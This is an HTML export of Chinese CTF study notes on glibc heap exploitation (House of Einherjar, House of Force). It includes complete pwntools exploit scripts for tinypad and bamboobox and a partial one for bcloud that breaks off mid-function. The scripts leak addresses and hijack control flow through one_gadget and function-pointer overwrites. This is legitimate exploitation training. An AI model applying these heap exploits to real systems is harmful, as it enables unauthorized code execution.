@@ -1,0 +1,654 @@
+<html>
+<head>
+<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<meta content="text/css" http-equiv="Content-Style-Type">
+<title>CTF PWN12</title>
+</head>
+<body>
+<h1 align="center" class="root">
+<a name="6ru69v7d09v21lrajsmu2ijcrq">CTF PWN12</a>
+</h1>
+<div align="center" class="globalOverview">
+<img src="CTF PWN12_files/images/CTF PWN12.jpg"></div>
+<h2 class="topic">
+<a name="3u890qu55mak504789jki474ad">堆溢出</a>
+</h2>
+<h3 class="topic">
+<a name="7sbjfvmufc3gmaedb35i9o9ss1">&nbsp;House Of Einherjar</a>
+</h3>
+<h3 class="topic">
+<a name="72e4tjc59usd1pa181h0vqosas">&nbsp;&nbsp;介绍</a>
+</h3>
+<h3 class="topic">
+<a name="57g8oeaur57m83ve43ciem33i9">&nbsp;&nbsp;&nbsp;向后合并-》合并低内存地址的chunk&#13;
+向前合并-》合并高内存地址的chunk</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/43hak6m6ad8vt4c0e93pip633i.png"></p>
+<h3 class="topic">
+<a name="12a5978tnc4gqnn0c5sjfugifb">&nbsp;&nbsp;chunk向后合并的原理</a>
+</h3>
+<h3 class="topic">
+<a name="3dg5sci74143r249q4tcgkeaq4">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/2tqv8hjns0s53q516t3669t20m.png"></p>
+<h3 class="topic">
+<a name="039cgl733d615p6sb5eor03tng">&nbsp;&nbsp;攻击原理</a>
+</h3>
+<h3 class="topic">
+<a name="4eb9ol9ig70bvffl1kgf3khnng">&nbsp;&nbsp;&nbsp;即因为pre_sizez字段是被相邻的两个chunk共同使用的，所以内存低地址的chunk而可以通过溢出控制相邻的内存高地址的chunk的pre_size 和PREV_INUSE字段从而控制向后合并时的p指针 ，因为最后p=p-pre_size，所以只要控制pre_size就几乎可以控制p指向任何地址</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/2phpmnnbesgma4a2dvnvvv9it5.png"></p>
+<h3 class="topic">
+<a name="6s3oipf5abh0b420ef9pm68tqk">&nbsp;&nbsp;攻击过程</a>
+</h3>
+<h3 class="topic">
+<a name="6dfpvq001dki7u9cs9lq6kjopb">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/1bdqjjte3mmge1ugdpv0chndal.png"></p>
+<h3 class="topic">
+<a name="05mi84k5v95cnc72qgeesbn88g">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/3ipame0gm5nf19oacfr8ssvoig.png"></p>
+<h3 class="topic">
+<a name="3behi9qm2703vfv08to0lggusk">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;需要注意要在对对应的位置处布置好fakechunk相关字段从而绕过unlink的检验</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/0oe5iq5fqvlsscuil4a046un1b.png"></p>
+<h3 class="topic">
+<a name="16iv74s1ju785plmr4gstgekbe">&nbsp;&nbsp;示例</a>
+</h3>
+<h3 class="topic">
+<a name="3qimugbvt31q03vn6ja520lm5i">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/0qo81rdnlu6fh9qg3244m6f430.png"></p>
+<h3 class="topic">
+<a name="0aq09bvkoqa2en2jb4850qhfjl">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/2q095dauu1og5q6lbccndu2nfb.png"></p>
+<h3 class="topic">
+<a name="4431hn55bdq830ttek793psqv4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时堆中情况为</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/6qhlge0f9jqr7r491ckkbjsdto.png"></p>
+<h3 class="topic">
+<a name="5s8940oknel1go65qf0p0nr29l">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意这里fakechunk中fd bk指针均被设置为s0用户空间首地址address，是为了绕过unlink检验，同样的设置nextfakechunk pre_size字段也是为了绕过unlink检验</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/3ist4s6mg1il4285m9ndrrqosa.png"></p>
+<h3 class="topic">
+<a name="1q4m09vo2iscaru3kvd27n5jdd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当然也可以将fakechunk的size字段设置为0x221，这样就是将s2作为fakechunk的nextchunk，s2的pre_size就作为了nextfakechunk pre_size</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/3ibkbs89t86agb8frfbo4ncfc3.png"></p>
+<h3 class="topic">
+<a name="1b5aslg86213hppdid448qer86">&nbsp;&nbsp;总结</a>
+</h3>
+<h3 class="topic">
+<a name="1enpb200s3m33l8k2n00aunbpv">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/1cdoj2f8p3r3j50vdjcn2omsui.png"></p>
+<h3 class="topic">
+<a name="0fc2g5jhpmiqu3is4v8fobn4ko">&nbsp;&nbsp;实例</a>
+</h3>
+<h3 class="topic">
+<a name="2cq2439j473cnpccljujcoe7t5">&nbsp;&nbsp;&nbsp;2016 Seccon tinypad</a>
+</h3>
+<h3 class="topic">
+<a name="3jsolncf8r0lemlsrfmjacht9q">&nbsp;&nbsp;&nbsp;&nbsp;基本功能分析</a>
+</h3>
+<h3 class="topic">
+<a name="1bivimvvqf541aopkcb1jkbhhv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/3cqm2951j7c2i6f05lvieapnv7.png"></p>
+<h3 class="topic">
+<a name="7pdt99khkap3ts0k1k652655rs">&nbsp;&nbsp;&nbsp;&nbsp;利用思路</a>
+</h3>
+<h3 class="topic">
+<a name="60rq2vtjebfmkk0aka6kk7rkdl">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/4mn269qa84f79i0kqn2t6uqvcg.png"></p>
+<h3 class="topic">
+<a name="2ln2sspd0rbmlu7fdfgku2bcgg">&nbsp;&nbsp;&nbsp;&nbsp;exp</a>
+</h3>
+<h3 class="topic">
+<a name="5s99h3fe3p6b2g0fdrcshrs9rh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;from pwn import *&#13;
+context.terminal = ['gnome-terminal', '-x', 'sh', '-c']&#13;
+if args['DEBUG']:&#13;
+    context.log_level = 'debug'&#13;
+tinypad = ELF("./tinypad")&#13;
+if args['REMOTE']:&#13;
+    p = remote('127.0.0.1', 7777)&#13;
+    libc = ELF('./libc.so.6')&#13;
+else:&#13;
+    p = process("./tinypad")&#13;
+    libc = ELF('./libc.so.6')&#13;
+    main_arena_offset = 0x3c4b20&#13;
+log.info('PID: ' + str(proc.pidof(p)[0]))&#13;
+&#13;
+&#13;
+def add(size, content):&#13;
+    p.recvuntil('(CMD)&gt;&gt;&gt; ')&#13;
+    p.sendline('a')&#13;
+    p.recvuntil('(SIZE)&gt;&gt;&gt; ')&#13;
+    p.sendline(str(size))&#13;
+    p.recvuntil('(CONTENT)&gt;&gt;&gt; ')&#13;
+    p.sendline(content)&#13;
+&#13;
+&#13;
+def edit(idx, content):&#13;
+    p.recvuntil('(CMD)&gt;&gt;&gt; ')&#13;
+    p.sendline('e')&#13;
+    p.recvuntil('(INDEX)&gt;&gt;&gt; ')&#13;
+    p.sendline(str(idx))&#13;
+    p.recvuntil('(CONTENT)&gt;&gt;&gt; ')&#13;
+    p.sendline(content)&#13;
+    p.recvuntil('Is it OK?\n')&#13;
+    p.sendline('Y')&#13;
+&#13;
+&#13;
+def delete(idx):&#13;
+    p.recvuntil('(CMD)&gt;&gt;&gt; ')&#13;
+    p.sendline('d')&#13;
+    p.recvuntil('(INDEX)&gt;&gt;&gt; ')&#13;
+    p.sendline(str(idx))&#13;
+&#13;
+&#13;
+def run():&#13;
+    p.recvuntil(&#13;
+        '  ============================================================================\n\n'&#13;
+    )&#13;
+    # 1. leak heap base&#13;
+    add(0x70, 'a' * 8)  # idx 0&#13;
+    add(0x70, 'b' * 8)  # idx 1&#13;
+    add(0x100, 'c' * 8)  # idx 2&#13;
+&#13;
+    delete(2)  # delete idx 1&#13;
+    delete(1)  # delete idx 0, idx 0 point to idx 1&#13;
+    p.recvuntil(' # CONTENT: ')&#13;
+    data = p.recvuntil('\n', drop=True)  # get pointer point to idx1&#13;
+    heap_base = u64(data.ljust(8, '\x00')) - 0x80&#13;
+    log.success('get heap base: ' + hex(heap_base))&#13;
+&#13;
+    # 2. leak libc base&#13;
+    # this will trigger malloc_consolidate&#13;
+    # first idx0 will go to unsorted bin&#13;
+    # second idx1 will merge with idx0(unlink), and point to idx0&#13;
+    # third idx1 will merge into top chunk&#13;
+    # but cause unlink feture, the idx0's fd and bk won't change&#13;
+    # so idx0 will leak the unsorted bin addr&#13;
+    delete(3)&#13;
+    p.recvuntil(' # CONTENT: ')&#13;
+    data = p.recvuntil('\n', drop=True)&#13;
+    unsorted_offset_arena = 8 + 10 * 8&#13;
+    main_arena = u64(data.ljust(8, '\x00')) - unsorted_offset_arena&#13;
+    libc_base = main_arena - main_arena_offset&#13;
+    log.success('main arena addr: ' + hex(main_arena))&#13;
+    log.success('libc base addr: ' + hex(libc_base))&#13;
+&#13;
+    # 3. house of einherjar&#13;
+    add(0x18, 'a' * 0x18)  # idx 0&#13;
+    # we would like trigger house of einherjar at idx 1&#13;
+    add(0x100, 'b' * 0xf8 + '\x11')  # idx 1&#13;
+    add(0x100, 'c' * 0xf8)  # idx 2&#13;
+    add(0x100, 'd' * 0xf8)  #idx 3&#13;
+&#13;
+    # create a fake chunk in tinypad's 0x100 buffer, offset 0x20&#13;
+    tinypad_addr = 0x602040&#13;
+    fakechunk_addr = tinypad_addr + 0x20&#13;
+    fakechunk_size = 0x101&#13;
+    fakechunk = p64(0) + p64(fakechunk_size) + p64(fakechunk_addr) + p64(&#13;
+        fakechunk_addr)&#13;
+    edit(3, 'd' * 0x20 + fakechunk)&#13;
+&#13;
+    # overwrite idx 1's prev_size and&#13;
+    # set minaddr of size to '\x00'&#13;
+    # idx 0's chunk size is 0x20&#13;
+    diff = heap_base + 0x20 - fakechunk_addr&#13;
+    log.info('diff between idx1 and fakechunk: ' + hex(diff))&#13;
+    # '\0' padding caused by strcpy&#13;
+    diff_strip = p64(diff).strip('\0')&#13;
+    number_of_zeros = len(p64(diff)) - len(diff_strip)&#13;
+    for i in range(number_of_zeros + 1):&#13;
+        data = diff_strip.rjust(0x18 - i, 'f')&#13;
+        edit(1, data)&#13;
+    delete(2)&#13;
+    p.recvuntil('\nDeleted.')&#13;
+&#13;
+    # fix the fake chunk size, fd and bk&#13;
+    # fd and bk must be unsorted bin&#13;
+    edit(4, 'd' * 0x20 + p64(0) + p64(0x101) + p64(main_arena + 88) +&#13;
+         p64(main_arena + 88))&#13;
+&#13;
+    # 3. overwrite malloc_hook with one_gadget&#13;
+&#13;
+    one_gadget_addr = libc_base + 0x45216&#13;
+    environ_pointer = libc_base + libc.symbols['__environ']&#13;
+    log.info('one gadget addr: ' + hex(one_gadget_addr))&#13;
+    log.info('environ pointer addr: ' + hex(environ_pointer))&#13;
+    #fake_malloc_chunk = main_arena - 60 + 9&#13;
+    # set memo[0].size = 'a'*8,&#13;
+    # set memo[0].content point to environ to leak environ addr&#13;
+    fake_pad = 'f' * (0x100 - 0x20 - 0x10) + 'a' * 8 + p64(&#13;
+        environ_pointer) + 'a' * 8 + p64(0x602148)&#13;
+    # get a fake chunk&#13;
+    add(0x100 - 8, fake_pad)  # idx 2&#13;
+    #gdb.attach(p)&#13;
+&#13;
+    # get environ addr&#13;
+    p.recvuntil(' # CONTENT: ')&#13;
+    environ_addr = p.recvuntil('\n', drop=True).ljust(8, '\x00')&#13;
+    environ_addr = u64(environ_addr)&#13;
+    main_ret_addr = environ_addr - 30 * 8&#13;
+&#13;
+    # set memo[0].content point to main_ret_addr&#13;
+    edit(2, p64(main_ret_addr))&#13;
+    # overwrite main_ret_addr with one_gadget addr&#13;
+    edit(1, p64(one_gadget_addr))&#13;
+    p.interactive()&#13;
+&#13;
+&#13;
+if __name__ == "__main__":&#13;
+    run()</a>
+</h3>
+<h3 class="topic">
+<a name="6lr49mndnvg6quhds869437t78">&nbsp;&nbsp;&nbsp;&nbsp;参考资料</a>
+</h3>
+<h3 class="topic">
+<a name="78d060esj9bjo3bv3u7u9svkj2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://blog.csdn.net/qq_38204481/article/details/82318094</a>
+</h3>
+<h3 class="topic">
+<a name="4qj00squb40055g0se0savp33j">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://www.cnblogs.com/pfcode/p/10758275.html</a>
+</h3>
+<h3 class="topic">
+<a name="33cb650gedk6ms251ug8oafteu">&nbsp;&nbsp;参考文献</a>
+</h3>
+<h3 class="topic">
+<a name="4mdkrnre56g0e5oorh0thrsu77">&nbsp;&nbsp;&nbsp;https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606</a>
+</h3>
+<h3 class="topic">
+<a name="255e4mq03sf9cel5ii25u4ug7f">&nbsp;&nbsp;&nbsp;https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf</a>
+</h3>
+<h3 class="topic">
+<a name="07te2dvhga3tqstbkuq83kl0ef">&nbsp;&nbsp;&nbsp;https://bbs.pediy.com/thread-226119.htm</a>
+</h3>
+<h3 class="topic">
+<a name="0e9vj3q2an1fkl0hlo98ttg26g">&nbsp;House Of Force</a>
+</h3>
+<h3 class="topic">
+<a name="6ipvs20pllnfn81vet1dhqp65t">&nbsp;&nbsp;介绍</a>
+</h3>
+<h3 class="topic">
+<a name="6a9ekde9mqbb59o9ng6l5b6e4u">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/2tq95ugithvnluhfl2bcjfppvc.png"></p>
+<h3 class="topic">
+<a name="6usmnto97g6ja8c6occfrefcmp">&nbsp;&nbsp;原理</a>
+</h3>
+<h3 class="topic">
+<a name="06vmi1uu1vevnk2j3u7i6u3pni">&nbsp;&nbsp;&nbsp;堆管理器中，如果所有的空闲块均无法满足申请需求，则会将topchunk的一部分切割出来作为chunk进行分配，另一部分作为新的topchunk，新topchunk的起始地址起始取决于所申请的堆块的大小，如果原本topchunk的指针为p，此时需要从topchunk中分割出0x20大小的chunk，，则p~p+0x1f之间的chunk被作为堆空间分配，而新的topchunk的起始地址为p+0x20，此时可以看到，申请内存的大小会影响topchunk的起始地址，如果之后再次从topchunk中申请chunk，则chunk的起始地址即为p+0x20，如果可以控制0x20为任何数，则可以将topchunk的起始地址设置为任意地址，从而在任意地址处申请chunk，并内存读写</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/20u7r5lk116oia8sppb9t2givq.png"></p>
+<h3 class="topic">
+<a name="1e2ae5a7mm7mpo6m0idbrgi97p">&nbsp;&nbsp;&nbsp;&nbsp;通过分割topchunk申请堆内存的过程</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/4ubcqqvmgd2tuqljdea3p7idff.png"></p>
+<h3 class="topic">
+<a name="5hhqp2jj66vjr5oaqdmmq356l5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;topchunk被分割后根据申请内存的大小，设置新的topchunk</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/4vv8aeqtqg73spijb3uborpgqo.png"></p>
+<h3 class="topic">
+<a name="37v575u75ee2s23fcvlg2reh0m">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;新的topchunk大小也会被修改，如果下一步要通过分割新topchunk继续申请堆空间，需要保证新topchunk被分割后的大小不小于最小的chunk的大小</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/6bmm0t6ojf53lob49u99lf0qnp.png"></p>
+<h3 class="topic">
+<a name="2d4q9n1shh9u6j2liraphfife7">&nbsp;&nbsp;示例</a>
+</h3>
+<h3 class="topic">
+<a name="54pu5r0ig0nh84gi3v3kj9dk52">&nbsp;&nbsp;&nbsp;使用hof攻击修改topchunk之前内存空间</a>
+</h3>
+<h3 class="topic">
+<a name="47vcce5a7sbdj1pdbabnpqfigp">&nbsp;&nbsp;&nbsp;&nbsp;将topchunk的size字段修改为-1，为之后以分割topchunk的方式申请堆内存做准备</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/4kifvfsg67hp2oj3uihgierfh4.png"></p>
+<h3 class="topic">
+<a name="5836g23lhkmor7i2akjqp2ku63">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/422pdb14t0i2efljlaip5i6ig7.png"></p>
+<h3 class="topic">
+<a name="0ibog35nni4opfd3bav6b28d5q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以目标地址与当前topchunk首地址之间的偏移作为依据，计算通过申请多大的内存空间，可以将让新topchunk申请到目标地址上</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/06otqadnn0ppkad6tmhtgeieno.png"></p>
+<h3 class="topic">
+<a name="1fiskp16tkne6mf86mguepm534">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;计算申请多少个字节的数据可以使得topchunk被分配的指定地址&#13;
+这里SIZE_SZ就是sizeof(size_t)，在32位系统为4，64位为8&#13;
+MINSIZ为最小的chunk的大小，32位中为16字节，64位中为32字节&#13;
+这里request2size宏主要用户将用户申请的大小转化为chunk的大小&#13;
+根据request2size的宏当64位中申请24(0x18)字节堆空间时&#13;
+(0x18+0x8+0xf)&lt;0x20? 0x20:(0x18+0x8+0xf)&amp;~0xf&#13;
+最终为0x2f&amp;~0xf=0x20，&#13;
+说明64位中申请24字节空间，系统会分配32字节的chunk&#13;
+当64为中申请25字节(0x19)堆空间&#13;
+(0x19+0x8+0xf)&amp;~0xf=0x30&amp;~0xf=0x30=48字节&#13;
+说明64位中申请25字节空间，系统会分配48字节的chunk</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/2ebgbt3ef23tc3ur3inpp1548b.png"></p>
+<h3 class="topic">
+<a name="6q5a4g22cdo9fl2qo76p6rjj5v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/644b9qnn933p6974kjble6fh9g.png"></p>
+<h3 class="topic">
+<a name="58fa15dedcgc7urkng07hshq49">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意根据glibc中malloc.c的源码，&#13;
+MALLOC_ALIGNMENT=（2*SIZE_SZ）&#13;
+MALLOC_ALIGN_MASK=(MALLOC_ALIGNMENT-1)&#13;
+即在64为系统中MALLOC_ALIGN_MASK等于0xf</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/0mg3crhah5btd9bhn8asckl1jt.png"></p>
+<h3 class="topic">
+<a name="3k9qa8f40pp81tmf13clli0onh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/653ltlvq5b87l58rbcjq9me185.png"></p>
+<h3 class="topic">
+<a name="09rvjia6j0mp74hl87aa71lgcn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/7uodlha15bogg7nmod9ui1qhq4.png"></p>
+<h3 class="topic">
+<a name="1qrps01erdmueou251g6k6qam7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;参考资料</a>
+</h3>
+<h3 class="topic">
+<a href="http://www.360doc.com/content/16/1216/18/36367108_615309187.shtml" name="4g594egup2rvrlvolk3i6k7ric">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://www.360doc.com/content/16/1216/18/36367108_615309187.shtml</a>
+</h3>
+<h3 class="topic">
+<a name="1v336m47fj4d8ilqu9859nvego">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;针对相关glibc源码分析去看Glibc内存管理Ptmalloc2源代码分析 .pdf</a>
+</h3>
+<h3 class="topic">
+<a name="1cei2rae2bn1emv0j3kev50pee">&nbsp;&nbsp;&nbsp;使用hof攻击修改topchunk之后内存空间</a>
+</h3>
+<h3 class="topic">
+<a name="65bsbk3q3acrlrqleivq5vl09u">&nbsp;&nbsp;&nbsp;&nbsp;与上一个相比，仅仅是第二次malloc的字节数有所不同</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/47blqfrjl1bh78rslh7q71u6h1.png"></p>
+<h3 class="topic">
+<a name="2vb1v7pb4v15ls1lcope4u3i8d">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本次修改的目标malloc_hook为libc.so中的一个全局变量，这里计算malloc具体的字节数的时候为何用偏移减去0x10呢？难道不是&#13;
+偏移-SIZE_SZ(0x8)-MALLOC_ALIGN_MASK(0xf)</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/5pu9p871ap90vdfqekp1enseui.png"></p>
+<h3 class="topic">
+<a name="1funnso2vmh5f4jjk0pt9h806a">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/1bn0ab49nf2aavgu6n9hi5aqcf.png"></p>
+<h3 class="topic">
+<a name="7dssb1qhgp63668kb2u63p0ajc">&nbsp;&nbsp;总结</a>
+</h3>
+<h3 class="topic">
+<a name="5he49gb1imteuccmlqqeat7uiu">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/430mrctjvgba63hj1s7ivi95d2.png"></p>
+<h3 class="topic">
+<a name="4bo7t7plc23ofqfhdf89q52kmu">&nbsp;&nbsp;实例</a>
+</h3>
+<h3 class="topic">
+<a name="700rv258jmunc1ch01jti0h232">&nbsp;&nbsp;&nbsp;HITCON training lab 11</a>
+</h3>
+<h3 class="topic">
+<a name="25h5c6p6hcnfgt2l63e959k48k">&nbsp;&nbsp;&nbsp;&nbsp;基本信息</a>
+</h3>
+<h3 class="topic">
+<a name="6rs45f5gf7irv7r5mljs6dqm0t">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/7dea9nsr4okh3q65theeetoho7.png"></p>
+<h3 class="topic">
+<a name="7u3gomk4m8q5n83732gt4ikgej">&nbsp;&nbsp;&nbsp;&nbsp;基本功能</a>
+</h3>
+<h3 class="topic">
+<a name="0ubmb0ko0hic732n4db4jb4o7a">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据分析该程序中存在函数magic，只要运行该程序就可以打印flag</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/24td803n1mgu13pkq6qflqfg7q.png"></p>
+<h3 class="topic">
+<a name="79phl2oi71r8bm1ukvls7lmc75">&nbsp;&nbsp;&nbsp;&nbsp;漏洞利用</a>
+</h3>
+<h3 class="topic">
+<a name="3fnanjuhtu45sni2ejv5tsuhl8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/20l7o5jf3os9tq5u9vgmcql1bh.png"></p>
+<h3 class="topic">
+<a name="5rkekbm0pm1b5tc4jkkq3n0660">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exp</a>
+</h3>
+<h3 class="topic">
+<a name="6blar1io7e3dcd0duj3vr2ohhe">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#!/usr/bin/env python&#13;
+# -*- coding: utf-8 -*-&#13;
+&#13;
+from pwn import *&#13;
+&#13;
+r = process('./bamboobox')&#13;
+context.log_level = 'debug'&#13;
+&#13;
+&#13;
+def additem(length, name):&#13;
+    r.recvuntil(":")&#13;
+    r.sendline("2")&#13;
+    r.recvuntil(":")&#13;
+    r.sendline(str(length))&#13;
+    r.recvuntil(":")&#13;
+    r.sendline(name)&#13;
+&#13;
+&#13;
+def modify(idx, length, name):&#13;
+    r.recvuntil(":")&#13;
+    r.sendline("3")&#13;
+    r.recvuntil(":")&#13;
+    r.sendline(str(idx))&#13;
+    r.recvuntil(":")&#13;
+    r.sendline(str(length))&#13;
+    r.recvuntil(":")&#13;
+    r.sendline(name)&#13;
+&#13;
+&#13;
+def remove(idx):&#13;
+    r.recvuntil(":")&#13;
+    r.sendline("4")&#13;
+    r.recvuntil(":")&#13;
+    r.sendline(str(idx))&#13;
+&#13;
+&#13;
+def show():&#13;
+    r.recvuntil(":")&#13;
+    r.sendline("1")&#13;
+&#13;
+&#13;
+magic = 0x400d49&#13;
+# we must alloc enough size, so as to successfully alloc from fake topchunk&#13;
+additem(0x30, "ddaa")  # idx 0&#13;
+payload = 0x30 * 'a'  # idx 0's content&#13;
+payload += 'a' * 8 + p64(0xffffffffffffffff)  # top chunk's prev_size and size&#13;
+# modify topchunk's size to -1&#13;
+modify(0, 0x41, payload)&#13;
+# top chunk's offset to heap base&#13;
+offset_to_heap_base = -(0x40 + 0x20)&#13;
+malloc_size = offset_to_heap_base - 0x8 - 0xf&#13;
+#gdb.attach(r)&#13;
+additem(malloc_size, "dada")&#13;
+additem(0x10, p64(magic) * 2)&#13;
+print r.recv()&#13;
+r.interactive()</a>
+</h3>
+<h3 class="topic">
+<a name="2448hm14a0psko0ic86lkqjrf5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;offset_to_heap_base = -(0x40 + 0x20)&#13;
+是计算当前topchunk到堆内存首地址的偏移，堆内存首地址是我们的目的地址，该处存放着两个函数指针，只要将magic函数的地址覆盖上去，就可以执行magic函数&#13;
+&#13;
+malloc_size = offset_to_heap_base - 0x8 - 0xf&#13;
+即偏移-SIZE_SZ-MALLOC_ALIGN_MASK&#13;
+&#13;
+additem(0x10, p64(magic) * 2)&#13;
+将堆区首地址处的两个函数指针均覆盖为magic函数的地址</a>
+</h3>
+<h3 class="topic">
+<a name="5ppsdcgeggvkcusq5qulasp4ab">&nbsp;&nbsp;&nbsp;2016 BCTF bcloud</a>
+</h3>
+<h3 class="topic">
+<a name="7cmbggvk3g8to3806mubc9e38s">&nbsp;&nbsp;&nbsp;&nbsp;基本信息</a>
+</h3>
+<h3 class="topic">
+<a name="18oo6nfill6djasfklc12a60qs">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/7d546536nm21od5otf8tup0h2u.png"></p>
+<h3 class="topic">
+<a name="7cckc73iofb56flug30ce5lgco">&nbsp;&nbsp;&nbsp;&nbsp;基本功能</a>
+</h3>
+<h3 class="topic">
+<a name="31us731j49g4j8uplarrug99e6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/698a17op0h1h0a5ofoinsk05g6.png"></p>
+<h3 class="topic">
+<a name="4jqcv0kv2cdrlrdu2mb84ic8ap">&nbsp;&nbsp;&nbsp;&nbsp;程序漏洞</a>
+</h3>
+<h3 class="topic">
+<a name="4p0480kjpncis6gnktsheektfe">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/1e1spp9vr793cv6v2fn9el76tj.png"></p>
+<h3 class="topic">
+<a name="2nkasl05g6b9ivr12l29937o63">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/467jqqstglrgjviubmnevn8ea6.png"></p>
+<h3 class="topic">
+<a name="37gc6t3lajqffpfg04rmk9km2a">&nbsp;&nbsp;&nbsp;&nbsp;漏洞利用</a>
+</h3>
+<h3 class="topic">
+<a name="7tclf3qhnu1s244tunrfk452u4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN12_files/32ufpk3supj3d3lu9ahb19v42q.png"></p>
+<h3 class="topic">
+<a name="433qnp261vk2kaf1o7bpugj9dp">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exp</a>
+</h3>
+<h3 class="topic">
+<a name="5l9f9p0cgc6n1b0ir6me7g3cr5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;from pwn import *&#13;
+context.terminal = ['gnome-terminal', '-x', 'sh', '-c']&#13;
+if args['DEBUG']:&#13;
+    context.log_level = 'debug'&#13;
+context.binary = "./bcloud"&#13;
+bcloud = ELF("./bcloud")&#13;
+if args['REMOTE']:&#13;
+    p = remote('127.0.0.1', 7777)&#13;
+else:&#13;
+    p = process("./bcloud")&#13;
+log.info('PID: ' + str(proc.pidof(p)[0]))&#13;
+libc = ELF('./libc.so.6')&#13;
+&#13;
+&#13;
+def offset_bin_main_arena(idx):&#13;
+    word_bytes = context.word_size / 8&#13;
+    offset = 4  # lock&#13;
+    offset += 4  # flags&#13;
+    offset += word_bytes * 10  # offset fastbin&#13;
+    offset += word_bytes * 2  # top,last_remainder&#13;
